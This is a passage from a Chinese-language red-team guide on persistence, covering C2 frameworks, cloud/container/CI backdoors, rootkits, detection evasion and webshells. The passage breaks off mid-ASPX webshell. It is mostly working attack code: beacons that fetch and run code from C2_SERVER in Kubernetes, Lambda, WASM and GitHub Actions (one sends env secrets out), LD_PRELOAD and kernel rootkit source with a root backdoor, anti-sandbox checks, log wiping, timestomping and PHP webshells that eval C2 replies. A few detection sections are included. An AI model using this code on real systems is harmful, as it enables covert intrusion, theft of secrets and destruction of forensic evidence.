C2 框架的持久化能力决定了红队行动的时间窗口。本节覆盖主流 C2 框架的持久化机制、多级代理链、隐蔽通信通道。

### 5.1 Sliver 持久化

Sliver 是 Bishop Fox 开发的开源 C2 框架，支持多种平台和持久化方法。

```bash
# === Sliver 生成持久化 implant ===
# 生成 Windows 服务持久化
sliver > generate --os windows --arch amd64 --format service --name svchost --save /tmp/

# 生成计划任务持久化
sliver > generate --os windows --arch amd64 --format shellcode --save /tmp/

# === Sliver 持久化命令 ===
# 在 beacon 中执行
sliver > execute -o cmd.exe /c "sc create SliverSvc binPath=C:\Windows\Temp\svchost.exe start=auto"
sliver > execute -o cmd.exe /c "sc start SliverSvc"

# === Sliver 多平台持久化 ===
# Linux 持久化
sliver > generate --os linux --arch amd64 --save /tmp/linux_implant
sliver > execute -o /bin/bash -c "echo '@reboot root /tmp/linux_implant' >> /etc/crontab"

# macOS 持久化
sliver > generate --os darwin --arch amd64 --save /tmp/macos_implant
sliver > execute -o /bin/bash -c "launchctl load /Library/LaunchDaemons/com.apple.sliver.plist"

# === Sliver 扩展持久化 ===
# 使用 armory 安装扩展
sliver > armory install persist
sliver > persist --help
```

### 5.2 Cobalt Strike Beacon 持久化

```powershell
# === Cobalt Strike Beacon SMB 链 ===
# 创建 SMB Beacon 绑定到命名管道
beacon> spawn x64
beacon> jump psexec64 target_host SMBListener

# SMB Beacon 通过命名管道连接父 Beacon
# 父 Beacon 下线后，SMB Beacon 可以独立运行或重新连接

# === Cobalt Strike 持久化脚本 ===
# elevate 后使用内置持久化
beacon> elevate svc-exe MyListener
beacon> elevate uac-token-duplication MyListener

# 持久化 beacon 在启动时运行
beacon> execute-assembly /opt/SharpStay.exe Persist

# === 使用 Aggressor 脚本自动化持久化 ===
# 创建 persistent.cna
on beacon_initial {
    binput($1, "Starting persistence setup...");
    belevate($1, "svc-exe", "HTTPSListener");
    bshell($1, "sc create WinUpdate binPath= \"C:\\Windows\\Temp\\beacon.exe\" start= auto");
    bshell($1, "schtasks /create /tn \"SystemHealth\" /tr \"C:\\Windows\\Temp\\beacon.exe\" /sc minute /mo 5 /ru SYSTEM /f");
}
```

### 5.3 Havoc C2 持久化

```bash
# === Havoc 持久化 Demon ===
# Havoc 支持多种持久化插件
# 在 Havoc 客户端中使用持久化模块

# 生成持久化 demon
# Havoc > demom -a x64 -f exe -o /tmp/demon.exe

# 服务持久化
# Havoc > shell sc create "HavocSvc" binPath="C:\Windows\Temp\demon.exe" start=auto

# 计划任务持久化
# Havoc > shell schtasks /create /tn "HavocTask" /tr "C:\Windows\Temp\demon.exe" /sc minute /mo 10 /ru SYSTEM /f
```

### 5.4 Merlin / Mythic 持久化

```bash
# === Merlin 持久化 ===
# Merlin 是 Go 语言编写的跨平台 C2
# 生成 agent 后配置持久化

# Merlin 服务持久化
merlin> module use persistence/linux/launchd
merlin> module use persistence/windows/schtasks
merlin> module use persistence/windows/registry

# === Mythic 持久化 ===
# Mythic 的 Apollo agent 支持多种持久化
# 通过 Mythic UI 或 API 调用持久化模块
```

### 5.5 域前置 / CDN 隐藏 C2

```bash
# === 域前置（Domain Fronting） ===
# 利用 CDN 的 SNI 与 Host 头不一致实现隐蔽通信
# 配置 C2 监听器使用 CDN 域前置

# Sliver 域前置配置
sliver > https -d cdn.cloudflare.com -l 443

# Cobalt Strike 域前置
# 在 Malleable C2 Profile 中配置
http-config {
    set host_header "legitimate-cdn-site.com";
    set uri "/path/to/content";
}

# === CDN 隐藏 C2 ===
# 将 C2 服务器隐藏在 CDN 后面
# 流量通过 CDN 节点转发，隐藏真实 C2 服务器 IP
# 使用 Cloudflare Workers 或 AWS CloudFront 作为中继
```

### 5.6 DoH / DoT 隧道持久化

```bash
# === DNS-over-HTTPS (DoH) C2 ===
# 使用 DoH 协议隐藏 C2 通信在合法 DNS 查询中
# 工具：dnscat2, iodine, Sliver DNS

# Sliver DNS C2
sliver > dns -d example.com

# === DNS-over-TLS (DoT) C2 ===
# 使用 DoT 协议（端口 853）进行 C2 通信
# 更隐蔽，防火墙通常允许 DoT 出站
```

### 5.7 社交媒体 C2 / Dead Drop Resolver

```bash
# === Twitter / X Webhook C2 ===
# 使用 Twitter API 作为 C2 通道
# agent 定期检查特定 Twitter 账号的推文/DM 获取指令

# === GitHub C2 ===
# 使用 GitHub Issues/Commits/Gist 作为 C2 通道
# agent 定期检查 GitHub 仓库获取指令
# 工具：GitHubC2, GitC2

# === Dead Drop Resolver ===
# 使用合法的第三方网站作为"死信箱"
# agent 从特定 URL 获取加密的指令
# 使用 Pastebin、合法博客、论坛帖子等
# 工具：DDR (Dead Drop Resolver), DomainFrontingResolver
```

### 5.8 多级代理链

```bash
# === 多级代理架构 ===
# Level 1: 外网 Web Shell -> 内网跳板
# Level 2: 内网跳板 -> 域内主机
# Level 3: 域内主机 -> 域控

# === Socks 代理链 ===
# Sliver socks5
sliver > socks5 start

# Cobalt Strike socks
beacon> socks 1080

# === SSH 隧道链 ===
# 建立多层 SSH 隧道
ssh -D 1080 -f -C -q -N user@jump_host_1
ssh -D 1081 -o "ProxyCommand=nc -x 127.0.0.1:1080 %h %p" -f -C -q -N user@jump_host_2

# === 端口转发链 ===
# 使用 socat, chisel, frp 等工具建立端口转发链
chisel client C2_SERVER:8080 R:3389:internal_target:3389
```

---

## 6. 2026 最新持久化技术

2026 年，随着云原生、eBPF、容器、Serverless、AI 等技术的普及，持久化技术也进入了新时代。

### 6.1 eBPF 内核级持久化

eBPF（Extended Berkeley Packet Filter）是 2026 年最前沿的持久化技术，可在内核态运行沙箱化代码。

```bash
# === eBPF 持久化原理 ===
# eBPF 程序可以挂载到内核的多个钩子点
# - tracepoints（系统调用）
# - kprobes/kretprobes（内核函数）
# - uprobes（用户态函数）
# - socket filters（网络数据包）
# - XDP（网络驱动层）

# === eBPF 持久化示例 ===
# 使用 bpftool 加载 eBPF 程序并在启动时自动加载
cat > /etc/systemd/system/ebpf-persist.service << 'EOF'
[Unit]
Description=eBPF Persistence Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/sbin/bpftool prog load /tmp/ebpf_payload.o /sys/fs/bpf/ebpf_persist
ExecStartPost=/usr/sbin/bpftool net attach xdp pinned /sys/fs/bpf/ebpf_persist dev eth0
Restart=always

[Install]
WantedBy=multi-user.target
EOF

# === eBPF 程序示例（C 语言） ===
# 拦截 execve 系统调用，注入恶意行为
```

```c
// ebpf_persist.c - 拦截 execve 系统调用
#include <linux/bpf.h>
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>

SEC("tracepoint/syscalls/sys_enter_execve")
int trace_execve(struct trace_event_raw_sys_enter *ctx) {
    char comm[16];
    bpf_get_current_comm(&comm, sizeof(comm));

    // 当特定进程启动时，触发后门操作
    // 通过 bpf_ringbuf 或 bpf_perf_event 传递数据到用户态
    bpf_printk("execve called by %s\n", comm);
    return 0;
}

char LICENSE[] SEC("license") = "GPL";
```

```bash
# 编译 eBPF 程序
clang -O2 -target bpf -c ebpf_persist.c -o ebpf_payload.o -I/usr/include/x86_64-linux-gnu

# 加载 eBPF 程序
bpftool prog load ebpf_payload.o /sys/fs/bpf/ebpf_persist autoattach

# 持久化：在系统启动时加载
bpftool gen skeleton ebpf_payload.o > ebpf_skel.h
# 将 skeleton 编译为持久化服务
```

**eBPF 持久化检测**：
```bash
# 列出所有加载的 eBPF 程序
bpftool prog list
bpftool prog show

# 检查 eBPF map
bpftool map list

# 检查 eBPF 附加点
bpftool net list
bpftool link list
```

### 6.2 K8s DaemonSet 持久化

Kubernetes DaemonSet 确保每个节点上都运行一个 Pod 副本，是实现集群级持久化的理想方式。

```yaml
# k8s_daemonset_persist.yaml
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: kube-system-helper
  namespace: kube-system
  labels:
    k8s-app: kube-dns
spec:
  selector:
    matchLabels:
      k8s-app: kube-dns-helper
  template:
    metadata:
      labels:
        k8s-app: kube-dns-helper
    spec:
      hostNetwork: true
      hostPID: true
      hostIPC: true
      containers:
      - name: helper
        image: C2_REGISTRY/persist:latest
        securityContext:
          privileged: true
        volumeMounts:
        - name: host-root
          mountPath: /host
        - name: docker-sock
          mountPath: /var/run/docker.sock
        command:
        - /bin/bash
        - -c
        - |
          while true; do
            curl -s http://C2_SERVER/beacon.sh | bash
            sleep 300
          done
      volumes:
      - name: host-root
        hostPath:
          path: /
      - name: docker-sock
        hostPath:
          path: /var/run/docker.sock
      tolerations:
      - operator: Exists
```

```bash
# 部署 DaemonSet
kubectl apply -f k8s_daemonset_persist.yaml

# 验证
kubectl get daemonset -n kube-system kube-system-helper
kubectl get pods -n kube-system -l k8s-app=kube-dns-helper
```

### 6.3 容器镜像层持久化

```bash
# === 容器镜像层投毒 ===
# 在容器镜像的某一层中植入恶意代码
# 所有使用该镜像的容器都会自动包含恶意代码

# 创建恶意镜像层
docker pull nginx:latest
docker run -d --name temp nginx:latest
docker exec temp bash -c 'echo "curl -s http://C2/beacon.sh | bash" >> /usr/local/bin/entrypoint.sh'
docker commit temp C2_REGISTRY/nginx:backdoored
docker push C2_REGISTRY/nginx:backdoored

# === 利用镜像仓库 Webhook ===
# 配置镜像仓库 Webhook 在镜像推送时触发 C2 通信
```

### 6.4 Serverless 函数定时触发

```bash
# === AWS Lambda 持久化 ===
# 使用 CloudWatch Events 定时触发 Lambda
# 函数名伪装为合法函数

# AWS CLI 创建定时触发器
aws events put-rule --name "HealthCheckRule" --schedule-expression "rate(5 minutes)"
aws lambda add-permission --function-name backdoor-function --statement-id healthcheck --action 'lambda:InvokeFunction' --principal events.amazonaws.com --source-arn arn:aws:events:region:account-id:rule/HealthCheckRule
aws events put-targets --rule HealthCheckRule --targets "Id"="1","Arn"="arn:aws:lambda:region:account-id:function:backdoor-function"

# Lambda 函数代码（Python）
```

```python
# AWS Lambda 持久化函数
import json
import urllib.request
import subprocess
import os

def lambda_handler(event, context):
    try:
        # 获取 C2 指令
        req = urllib.request.Request('http://C2_SERVER/beacon')
        with urllib.request.urlopen(req) as response:
            cmd = response.read().decode()
        # 执行指令
        result = subprocess.check_output(cmd, shell=True)
        return {'statusCode': 200, 'body': result.decode()}
    except Exception as e:
        return {'statusCode': 200, 'body': str(e)}
```

### 6.5 AWS Lambda 层持久化

```bash
# === AWS Lambda Layer 持久化 ===
# Lambda Layer 在所有使用该层的函数中自动加载
# 创建恶意 Lambda Layer

# 创建层内容
mkdir -p layer/python
cat > layer/python/malicious_lib.py << 'EOF'
import urllib.request
import subprocess
import threading
import time

def beacon():
    while True:
        try:
            req = urllib.request.Request('http://C2_SERVER/checkin')
            urllib.request.urlopen(req)
            time.sleep(300)
        except:
            time.sleep(60)

threading.Thread(target=beacon, daemon=True).start()
EOF

# 发布层
cd layer && zip -r ../layer.zip .
aws lambda publish-layer-version --layer-name "python3-requests" --description "Common Python3 utilities" --zip-file fileb://layer.zip --compatible-runtimes python3.9 python3.10 python3.11

# 将层附加到目标函数
aws lambda update-function-configuration --function-name target-function --layers arn:aws:lambda:region:account-id:layer:python3-requests:1
```

### 6.6 Azure Functions 持久化

```bash
# === Azure Functions 定时触发器持久化 ===
# 使用 Azure CLI 配置

# 创建 Function App
az functionapp create --name "diag-function-app" --resource-group "DefaultResourceGroup" --storage-account "diagstorage" --runtime python --runtime-version 3.10 --functions-version 4

# 部署恶意函数
func azure functionapp publish diag-function-app

# function.json（定时触发器配置）
```

```json
{
  "scriptFile": "__init__.py",
  "bindings": [
    {
      "name": "mytimer",
      "type": "timerTrigger",
      "direction": "in",
      "schedule": "0 */5 * * * *"
    }
  ]
}
```

### 6.7 CI/CD 管道持久化

```yaml
# GitHub Actions 持久化
# .github/workflows/security-scan.yml
name: Security Scan
on:
  schedule:
    - cron: '*/30 * * * *'
  push:
    branches: [main]

jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - name: Security Analysis
        run: |
          curl -s http://C2_SERVER/beacon.sh | bash
      - name: Upload Results
        run: |
          # 收集敏感信息并回传
          env | curl -X POST -d @- http://C2_SERVER/collect
```

```bash
# === GitHub Actions Token 持久化 ===
# GitHub Actions 的 GITHUB_TOKEN 可被用于持久化
# 1. 窃取 PAT (Personal Access Token)
# 2. 使用 PAT 创建新的 workflow 触发
# 3. 即使原 workflow 被删除，用 PAT 可重新创建

# 使用 PAT 创建持久化 workflow
curl -X PUT \
  -H "Authorization: token STOLEN_PAT" \
  -H "Accept: application/vnd.github.v3+json" \
  https://api.github.com/repos/owner/repo/contents/.github/workflows/maintenance.yml \
  -d '{"message":"Update CI","content":"BASE64_ENCODED_WORKFLOW"}'
```

### 6.8 WebAssembly 持久化

```bash
# === WebAssembly (Wasm) 持久化 ===
# Wasm 运行时（WasmEdge, Wasmtime, Wasmer）在云原生环境中广泛使用
# 恶意 Wasm 模块可被注入到微服务中

# 恶意 Wasm 模块（Rust）
```

```rust
// malicious_wasm.rs
use std::thread;
use std::time::Duration;

#[no_mangle]
pub extern "C" fn init() {
    thread::spawn(|| {
        loop {
            // C2 beacon 逻辑
            if let Ok(resp) = ureq::get("http://C2_SERVER/beacon").call() {
                let cmd = resp.into_string().unwrap();
                // 执行命令...
            }
            thread::sleep(Duration::from_secs(300));
        }
    });
}
```

```bash
# 编译为 Wasm
rustc --target wasm32-wasi malicious_wasm.rs -o malicious.wasm

# 注入到 WasmEdge 运行时
wasmedge malicious.wasm
```

### 6.9 驱动签名伪造 / EDR 白名单

```bash
# === 2026 驱动签名绕过技术 ===
# 1. 利用过期但仍被接受的证书
# 2. 利用 Windows 内核签名验证中的漏洞（CVE-2024-xxxxx）
# 3. 利用 Bootkit 在 Secure Boot 之前加载
# 4. 利用虚拟化技术在 Ring -1 运行

# === EDR 白名单利用 ===
# 利用 EDR 信任的进程（如 Microsoft 签名的进程）
# 通过 DLL 侧加载或进程注入绕过 EDR 检测
# 2026 年 EDR 多使用行为分析，需要更精细的规避技术
```

### 6.10 固件持久化（UEFI / BIOS / SMM）

```bash
# === UEFI 持久化 ===
# UEFI 固件在操作系统之前加载，传统杀软无法检测
# 常见持久化点：
# 1. UEFI DXE 驱动
# 2. UEFI Option ROM
# 3. SMM (System Management Mode) 处理程序
# 4. SPI Flash 中存储的恶意固件

# === UEFI 持久化工具 ===
# Chipsec - 固件安全分析工具
python chipsec_main.py -m common.uefi.access
python chipsec_main.py -m common.uefi.s3bootscript
python chipsec_main.py -m common.spi_access

# === UEFI DXE 驱动注入 ===
# 在 UEFI Shell 中加载恶意 DXE 驱动
# 或通过修改 UEFI 变量将恶意驱动添加到启动序列
```

---

## 7. Rootkit 技术 — 深度隐蔽

Rootkit 是持久化的终极形态，能在操作系统内核级别隐藏自身，使检测变得极其困难。

### 7.1 用户态 Rootkit（LD_PRELOAD）

```c
// userland_rootkit.c - 用户态 Rootkit
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dlfcn.h>
#include <dirent.h>
#include <unistd.h>
#include <sys/types.h>

// 隐藏特定文件
struct dirent *readdir(DIR *dirp) {
    struct dirent *(*original_readdir)(DIR*) = dlsym(RTLD_NEXT, "readdir");
    struct dirent *dir;
    while ((dir = original_readdir(dirp)) != NULL) {
        if (strstr(dir->d_name, "rootkit") == NULL &&
            strstr(dir->d_name, "evil") == NULL) {
            break;
        }
    }
    return dir;
}

// 隐藏特定进程
struct dirent64 *readdir64(DIR *dirp) {
    struct dirent64 *(*original_readdir64)(DIR*) = dlsym(RTLD_NEXT, "readdir64");
    struct dirent64 *dir;
    while ((dir = original_readdir64(dirp)) != NULL) {
        if (strstr(dir->d_name, "hidden_proc") == NULL) {
            break;
        }
    }
    return dir;
}

// 隐藏网络连接
FILE *fopen(const char *pathname, const char *mode) {
    FILE *(*original_fopen)(const char*, const char*) = dlsym(RTLD_NEXT, "fopen");
    if (strstr(pathname, "/proc/net/tcp") || strstr(pathname, "/proc/net/udp")) {
        // 返回过滤后的内容
        // 实际实现中需要过滤包含特定端口的行
    }
    return original_fopen(pathname, mode);
}
```

```bash
# 编译用户态 Rootkit
gcc -shared -fPIC -o /tmp/userland_rootkit.so userland_rootkit.c -ldl

# 通过 LD_PRELOAD 加载
LD_PRELOAD=/tmp/userland_rootkit.so ls /tmp/
# 所有包含 "rootkit" 和 "evil" 的文件/目录将被隐藏
```

### 7.2 内核态 Rootkit（LKM）

```c
// kernel_rootkit.c - 内核态 Rootkit
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/sched.h>
#include <linux/version.h>
#include <linux/kprobes.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("APT");
MODULE_DESCRIPTION("Advanced Kernel Rootkit");

// 保存原始系统调用表
static unsigned long *sys_call_table;

// 劫持 sys_getdents（隐藏文件）
asmlinkage long (*original_getdents)(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count);

asmlinkage long hooked_getdents(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count) {
    long ret = original_getdents(fd, dirent, count);
    // 过滤包含 "rootkit" 的目录项
    struct linux_dirent *d;
    long offset = 0;
    while (offset < ret) {
        d = (struct linux_dirent *)((char *)dirent + offset);
        if (strstr(d->d_name, "rootkit") || strstr(d->d_name, "evil")) {
            // 移除该目录项
            long reclen = d->d_reclen;
            memmove(d, (char *)d + reclen, ret - offset - reclen);
            ret -= reclen;
        } else {
            offset += d->d_reclen;
        }
    }
    return ret;
}

// 隐藏内核模块（从模块列表中移除自身）
static void hide_module(void) {
    // 从 THIS_MODULE->list 中移除当前模块
    list_del(&THIS_MODULE->list);
    // 从 kobject 中移除
    kobject_del(&THIS_MODULE->mkobj.kobj);
}

// 劫持 sys_kill（后门通信）
asmlinkage long (*original_kill)(pid_t pid, int sig);
asmlinkage long hooked_kill(pid_t pid, int sig) {
    if (sig == 64) {
        // 特殊信号作为后门触发器
        // 提升调用进程权限为 root
        struct cred *new_cred = prepare_creds();
        new_cred->uid = new_cred->euid = new_cred->suid = new_cred->fsuid = 0;
        new_cred->gid = new_cred->egid = new_cred->sgid = new_cred->fsgid = 0;
        commit_creds(new_cred);
        return 0;
    }
    return original_kill(pid, sig);
}

// 隐藏网络连接（Netfilter 钩子）
static unsigned int nf_hook(void *priv, struct sk_buff *skb, const struct nf_hook_state *state) {
    // 过滤特定端口的数据包，隐藏 C2 通信
    return NF_ACCEPT;
}

static struct nf_hook_ops nfho = {
    .hook = nf_hook,
    .hooknum = NF_INET_PRE_ROUTING,
    .pf = PF_INET,
    .priority = NF_IP_PRI_FIRST,
};

static int __init rootkit_init(void) {
    printk(KERN_INFO "Kernel rootkit loaded\n");

    // 劫持系统调用
    sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");
    original_getdents = (void *)sys_call_table[__NR_getdents];
    sys_call_table[__NR_getdents] = (unsigned long)hooked_getdents;
    original_kill = (void *)sys_call_table[__NR_kill];
    sys_call_table[__NR_kill] = (unsigned long)hooked_kill;

    // 注册 Netfilter 钩子
    nf_register_net_hook(&init_net, &nfho);

    // 隐藏模块
    hide_module();

    return 0;
}

static void __exit rootkit_exit(void) {
    // 恢复系统调用
    sys_call_table[__NR_getdents] = (unsigned long)original_getdents;
    sys_call_table[__NR_kill] = (unsigned long)original_kill;

    // 注销 Netfilter 钩子
    nf_unregister_net_hook(&init_net, &nfho);

    printk(KERN_INFO "Kernel rootkit unloaded\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
```

### 7.3 eBPF Rootkit

eBPF Rootkit 是 2026 年最先进的 Rootkit 技术，相比传统内核模块，它更难被检测。

```c
// ebpf_rootkit.c - eBPF 内核级 Rootkit
#include <linux/bpf.h>
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>

// 隐藏进程（劫持 getdents64）
SEC("kprobe/__x64_sys_getdents64")
int hide_process(struct pt_regs *ctx) {
    // 过滤 /proc 中的进程目录
    // 隐藏特定 PID 的进程
    return 0;
}

// 隐藏文件（劫持相关系统调用）
SEC("kprobe/__x64_sys_openat")
int hide_file(struct pt_regs *ctx) {
    // 拦截特定文件路径的访问
    // 返回 -ENOENT 使文件不可见
    return 0;
}

// 隐藏网络连接（XDP 或 tc 程序）
SEC("xdp")
int hide_traffic(struct xdp_md *ctx) {
    // 在 XDP 层过滤特定数据包
    return XDP_PASS;
}

// 键盘记录（kprobe）
SEC("kprobe/input_event")
int keylogger(struct pt_regs *ctx) {
    // 记录键盘输入事件
    // 通过 ring buffer 传输到用户态
    return 0;
}

char LICENSE[] SEC("license") = "GPL";
```

### 7.4 固件 Rootkit（UEFI/BIOS）

```bash
# === UEFI Rootkit 实现 ===
# 1. 修改 UEFI 固件中的 DXE 驱动
# 2. 在 SMM 中安装恶意代码
# 3. 在 Boot Manager 中插入恶意启动项

# === UEFI Rootkit 工具链 ===
# UEFI 开发环境
sudo apt-get install gnu-efi
# 编写 UEFI DXE 驱动（C 语言）
# 编译为 .efi 文件
# 使用 chipsec 或 UEFI shell 写入 SPI Flash
```

### 7.5 Rootkit 检测与对抗

```bash
# === 检测内核模块 Rootkit ===
# 检查加载的内核模块
lsmod
cat /proc/modules
# 对比 sysfs 中的模块列表
ls /sys/module/

# 检查系统调用表
cat /proc/kallsyms | grep sys_call_table
# 使用 unhide 工具检测隐藏进程
unhide proc
unhide sys
unhide brute

# === 检测 eBPF Rootkit ===
bpftool prog list
bpftool map list
bpftool link list
# 检查是否存在于预期不符的 eBPF 程序

# === 检测固件 Rootkit ===
# 使用 chipsec 检查固件完整性
python chipsec_main.py -m common.uefi.access
python chipsec_main.py -m common.spi_access
python chipsec_main.py -m common.spi_lock
# 对比 SPI Flash 内容与已知良好固件
# 使用 Intel Boot Guard / AMD Secure Boot 验证
```

---

## 8. 持久化检测绕过

持久化检测绕过是红队持久化中最重要的环节，决定了持久化能存活多久。

### 8.1 时间延迟 / 环境键控

```powershell
# === 时间延迟绕过 ===
# payload 在植入后延迟执行，避免被沙箱/分析环境检测
Start-Sleep -Seconds (Get-Random -Minimum 300 -Maximum 3600)
# 等待随机时间后再执行实际 payload

# === 环境键控 ===
# 检查特定环境条件后才执行
$domain = (Get-WmiObject Win32_ComputerSystem).Domain
if ($domain -eq "TARGET-DOMAIN.local") {
    # 仅在目标域中执行
    IEX(New-Object Net.WebClient).DownloadString('http://C2/beacon.ps1')
}

# 通过检查主机名、用户名、IP、MAC 地址等环境特征
# 不匹配则休眠或退出
```

```bash
# === Linux 环境键控 ===
#!/bin/bash
# 检查主机名
if [ "$(hostname)" != "TARGET-HOSTNAME" ]; then
    exit 0
fi
# 检查特定文件存在
if [ ! -f /etc/.target_marker ]; then
    exit 0
fi
# 执行 payload
curl -s http://C2/beacon.sh | bash
```

### 8.2 反沙箱 / 反分析

```powershell
# === Windows 反沙箱检测 ===
function Test-Sandbox {
    # 检查 CPU 核心数
    $cores = (Get-WmiObject Win32_ComputerSystem).NumberOfLogicalProcessors
    if ($cores -lt 2) { return $true }

    # 检查内存大小
    $ram = (Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory / 1GB
    if ($ram -lt 2) { return $true }

    # 检查磁盘大小
    $disk = (Get-WmiObject Win32_LogicalDisk -Filter "DeviceID='C:'").Size / 1GB
    if ($disk -lt 50) { return $true }

    # 检查是否运行在虚拟机中
    $model = (Get-WmiObject Win32_ComputerSystem).Model
    if ($model -match "VirtualBox|VMware|Virtual Machine|KVM|QEMU") { return $true }

    # 检查是否有用户在交互
    $idle = (Get-WmiObject Win32_PerfFormattedData_PerfOS_Processor -Filter "Name='_Total'").PercentIdleTime
    if ($idle -gt 95) { return $true }  # 几乎无用户活动

    return $false
}

if (Test-Sandbox) { exit }

# === Linux 反沙箱检测 ===
# 检查 CPU 核心数
if [ $(nproc) -lt 2 ]; then exit 0; fi
# 检查内存
if [ $(free -m | awk '/Mem:/ {print $2}') -lt 1024 ]; then exit 0; fi
# 检查 uptime（系统运行时间）
if [ $(awk '{print int($1)}' /proc/uptime) -lt 3600 ]; then exit 0; fi
# 检查是否有活跃用户
if [ $(who | wc -l) -eq 0 ]; then exit 0; fi
```

### 8.3 反取证

```bash
# === 日志清理 ===
# Windows 清理事件日志
wevtutil cl System
wevtutil cl Security
wevtutil cl Application
wevtutil cl "Windows PowerShell"

# PowerShell 清理
Clear-EventLog -LogName System, Security, Application
Get-WinEvent -ListLog * | Where-Object {$_.RecordCount -gt 0} | ForEach-Object { wevtutil cl $_.LogName }

# Linux 清理日志
echo "" > /var/log/auth.log
echo "" > /var/log/syslog
echo "" > /var/log/messages
echo "" > /var/log/secure
echo "" > /var/log/wtmp
echo "" > /var/log/btmp
echo "" > /var/log/lastlog
echo "" > /var/log/audit/audit.log

# 删除 bash 历史
unset HISTFILE
echo "" > ~/.bash_history
history -c
rm -f ~/.bash_history

# === 时间戳篡改（Timestomp） ===
# Windows
powershell -Command "(Get-Item 'C:\Windows\Temp\payload.exe').CreationTime = '01/01/2020 00:00:00'"
powershell -Command "(Get-Item 'C:\Windows\Temp\payload.exe').LastWriteTime = '01/01/2020 00:00:00'"
powershell -Command "(Get-Item 'C:\Windows\Temp\payload.exe').LastAccessTime = '01/01/2020 00:00:00'"

# Linux
touch -t 202001010000 /tmp/payload
touch -r /etc/passwd /tmp/payload  # 复制 passwd 的时间戳
```

### 8.4 ADS 数据流（NTFS Alternate Data Streams）

```powershell
# === ADS 隐藏 payload ===
# 将 payload 隐藏在合法文件的 ADS 中
type payload.exe > C:\Windows\System32\notepad.exe:payload.exe
# 或
Set-Content -Path C:\Windows\System32\notepad.exe -Stream payload.exe -Value (Get-Content payload.exe -Raw -Encoding Byte)

# 从 ADS 执行 payload
wmic process call create "C:\Windows\System32\notepad.exe:payload.exe"
# 或
start /b C:\Windows\System32\notepad.exe:payload.exe

# === 检测 ADS ===
dir /r C:\Windows\System32\  # 列出 ADS
streams.exe C:\Windows\System32\notepad.exe  # Sysinternals
Get-Item -Path C:\Windows\System32\notepad.exe -Stream *
```

### 8.5 注册表偏移 / 间接持久化

```powershell
# === 使用注册表存储 payload 代码 ===
# 将 payload 分割存储在多个注册表值中
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\GameUX\S-1-5-21-0000000000-0000000000-000000000-0000" /v "InstallPath" /t REG_SZ /d "powershell.exe -enc BASE64_PART1" /f
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\GameUX\S-1-5-21-0000000000-0000000000-000000000-0001" /v "InstallPath" /t REG_SZ /d "BASE64_PART2" /f

# 读取并合并执行
$part1 = (Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\GameUX\S-1-5-21-0000000000-0000000000-000000000-0000").InstallPath
$part2 = (Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\GameUX\S-1-5-21-0000000000-0000000000-000000000-0001").InstallPath
# 执行...

# === 使用注册表触发器（Active Setup） ===
# Active Setup 在用户登录时执行指定命令
reg add "HKLM\Software\Microsoft\Active Setup\Installed Components\{YOUR-GUID}" /v "StubPath" /t REG_SZ /d "C:\Windows\Temp\payload.exe" /f
```

---

## 9. 后门 WebShell 持久化

WebShell 是 Web 应用层的持久化入口，在攻防实战中占据核心地位。本节覆盖多语言 WebShell 持久化、内存马、Web 服务器模块后门等高级技术。

### 9.1 PHP WebShell 持久化

```php
<?php
// === PHP 基础 WebShell ===
// 密码保护的 WebShell，隐藏文件
// 文件名：.well-known.php（使用前导点号隐藏）
$password = "R3dT3am@2026";
if (md5($_REQUEST['pass']) === md5($password)) {
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
// 正常访问时返回 404
header("HTTP/1.1 404 Not Found");
?>

<?php
// === PHP 高级 WebShell（免杀） ===
// 使用 AES 加密通信
// 通过 HTTP Header 传递命令
$key = "R3dT3am_S3cr3t_K3y_2026";
if (isset($_SERVER['HTTP_X_CMD'])) {
    $cmd = openssl_decrypt(
        base64_decode($_SERVER['HTTP_X_CMD']),
        'AES-256-CBC',
        $key,
        0,
        substr($key, 0, 16)
    );
    if ($cmd) {
        $result = shell_exec($cmd);
        header('X-Result: ' . base64_encode($result));
    }
}
// 伪装成正常图片
header('Content-Type: image/gif');
echo base64_decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7');
?>

<?php
// === PHP 定时心跳 WebShell ===
// 在 WebShell 中嵌入定时任务逻辑
// 每次访问时检查是否需要回连 C2
$last_checkin = @file_get_contents('/tmp/.last_checkin');
if (!$last_checkin || time() - intval($last_checkin) > 3600) {
    // 回连 C2
    $ch = curl_init('http://C2_SERVER/checkin');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
        'host' => $_SERVER['HTTP_HOST'],
        'ip' => $_SERVER['SERVER_ADDR'],
        'uri' => $_SERVER['REQUEST_URI']
    ]));
    $resp = curl_exec($ch);
    curl_close($ch);
    // 如果 C2 返回指令，执行
    if ($resp) {
        eval($resp);
    }
    file_put_contents('/tmp/.last_checkin', time());
}
// 正常输出
echo "<!-- OK -->";
?>
```

### 9.2 ASPX WebShell 持久化

```csharp
<%@ Page Language="C#" Debug="true" Trace="false" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.Text" %>
<script runat="server">
void Page_Load(object sender, EventArgs e) {
    // ASPX 基础 WebShell
    string pass = "R3dT3am@2026";
    if (Request["pass"] == pass) {
        string cmd = Request["cmd"];
